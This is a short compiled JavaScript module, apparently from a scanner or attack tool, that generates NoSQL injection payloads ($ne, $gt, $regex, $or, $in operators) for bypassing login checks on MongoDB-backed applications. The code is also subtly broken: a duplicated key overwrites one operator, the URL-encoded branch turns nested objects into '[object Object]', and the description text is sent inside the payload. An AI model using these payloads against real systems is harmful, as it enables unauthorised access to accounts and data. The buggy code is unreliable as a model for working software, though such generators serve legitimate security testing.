"use strict";
Object.defineProperty(exports, "__esModule", { value: true });
exports.generatePayloads = generatePayloads;
function generatePayloads(fieldName, isJson) {
    const payloads = [
        { [fieldName]: { "$ne": null }, description: "Equality check for null" },
        { [fieldName]: { "$gt": "" }, description: "Greater than empty string" },
        { "$or": [{ [fieldName]: "admin" }, { [fieldName]: { "$ne": "a" } }], description: "Logical OR for fieldName" },
        { [fieldName]: { "$regex": ".*" }, description: "Regex match for fieldName" },
        { [fieldName]: { "$in": ["admin", "user"] }, [fieldName]: { "$ne": "password" }, description: "In list for fieldName and not equal for another value" }
    ];
    if (!isJson) {
        return payloads.map(payload => ({
            payload: new URLSearchParams(payload).toString(),
            description: payload.description
        }));
    }
    return payloads.map(payload => ({
        payload: JSON.stringify(payload),
        description: payload.description
    }));
}
